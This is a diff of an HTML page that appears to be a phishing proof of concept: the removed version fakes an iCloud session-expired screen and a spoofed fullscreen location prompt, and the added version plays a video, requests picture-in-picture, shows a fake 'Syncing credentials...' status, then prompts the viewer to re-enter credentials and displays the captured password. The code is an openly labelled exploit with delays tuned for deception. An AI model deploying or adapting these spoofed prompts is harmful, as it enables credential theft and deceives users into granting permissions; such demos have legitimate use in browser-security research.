@@ -2,57 +2,74 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>iCloud Session Expired</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Watch Secure Video</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, sans-serif;
-      background: white;
-      text-align: center;
-    }
-    .center {
+    body {
+      background-color: #000;
+      color: white;
+      font-family: sans-serif;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
+      margin: 0;
     }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
+
+    video {
+      max-width: 90%;
+      border: 2px solid white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #status {
       margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="center">
-    <h2>🔒 Your iCloud Session has expired</h2>
-    <p>Please verify to continue.</p>
-    <button onclick="goFull()">Continue</button>
-  </div>
+
+  <video id="vid" muted playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+  </video>
+  <div id="status">Tap video to play...</div>
 
   <script>
-    function goFull() {
-      document.documentElement.requestFullscreen().then(() => {
-        // spoof UI inside fullscreen
-        document.body.innerHTML = `
-          <div class="center">
-            <h2>📍 Confirm Location Access</h2>
-            <p>We need your location to continue.</p>
-            <button onclick="triggerLocation()">Allow</button>
-          </div>
-        `;
-      });
-    }
+    const video = document.getElementById("vid");
+    const status = document.getElementById("status");
 
-    function triggerLocation() {
-      navigator.geolocation.getCurrentPosition(
-        () => alert("✅ Location access granted."),
-        () => alert("❌ Location access denied.")
-      );
-    }
+    video.addEventListener("click", async () => {
+      try {
+        status.textContent = "Playing video...";
+
+        await video.play();
+
+        // Gesture persistence in play
+        if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
+          await video.requestPictureInPicture();
+        }
+
+        // Simulate "background action" delay
+        setTimeout(() => {
+          status.textContent = "Syncing credentials...";
+
+          setTimeout(() => {
+            const pw = prompt("🔒 Session Timed Out\nPlease re-enter your credentials to continue");
+            if (pw) {
+              alert("Captured: " + pw);
+            } else {
+              alert("No credentials entered.");
+            }
+          }, 1000); // Delay after fake status update
+
+        }, 4000); // Total delay 4s (can be tuned: 2000–6000ms ideal)
+
+      } catch (err) {
+        console.error("Exploit failed", err);
+      }
+    });
   </script>
+
 </body>
 </html>
